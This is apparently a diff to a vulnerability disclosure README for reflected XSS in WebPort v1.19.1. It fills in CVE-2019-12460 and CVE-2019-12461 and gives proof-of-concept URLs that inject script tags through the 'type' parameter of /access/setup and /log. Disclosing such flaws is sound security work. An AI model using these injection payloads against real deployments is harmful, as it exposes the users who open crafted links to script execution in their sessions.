@@ -1,8 +1,8 @@
 # WebPort-v1.19.1-Reflected-XSS
 Reflected XSS in [WebPort-v1.19.1](http://webport.se) impacts users who open a maliciously crafted link or third-party web page.
 
-# CVE-2019-XXXX
-https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-XXXX
+# CVE-2019-12460
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12460
 
 # PoC-1
 To exploit vulnerability, someone could use **'http://[server]:8090/access/setup?type="</script><script>alert('xss');</script><script>'** request to impact users who open a maliciously crafted link or third-party web page.
@@ -22,8 +22,8 @@ Upgrade-Insecure-Requests: 1
 
 ![alt tag](https://emreovunc.com/blog/en/WebPort-Reflected-XSS-01.png)
 
-# CVE-2019-XXXX
-https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-XXXX
+# CVE-2019-12461
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12461
 
 # PoC-2
 To exploit vulnerability, someone could use **'http://[server]:8090/log?type="</script><script>alert('xss');</script><script>'** request to impact users who open a maliciously crafted link or third-party web page.
